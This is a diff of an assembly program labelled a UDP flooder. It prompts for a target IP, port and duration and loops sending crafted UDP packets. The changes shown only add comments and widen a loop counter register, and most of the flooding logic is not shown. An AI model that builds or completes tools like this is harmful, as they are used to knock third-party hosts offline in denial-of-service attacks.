@@ -1,6 +1,6 @@
 ; Weeke's -> UDP Flooder (Assembly)
 
-section .data   ; Constant Data
+section .data                                                                  ; Constant Data
         getIPMsg db 'Enter IP: '                                               ; Get IP Input
         lenGetIPMsg equ $-getIPMsg                                             ; Get Length of input
 
@@ -16,7 +16,7 @@ section .data   ; Constant Data
         getTest db 'test message for loop'
         lenGetTest equ $-getTest
 
-section .bss
+section .bss                                                                   ; Variable Data
         internet_protocol resb 16
         port resb 6
         time resb 25
@@ -78,7 +78,7 @@ _start:                                                                         
 
 
         ; Loop for var time
-        mov cl, time
+        mov ecx, time
         l1:                                                                   ; Body of Loop
            ; Send Crafted UDP packet till time var ends from loop
            mov edx, lenGetTest                                                  ; Message Length
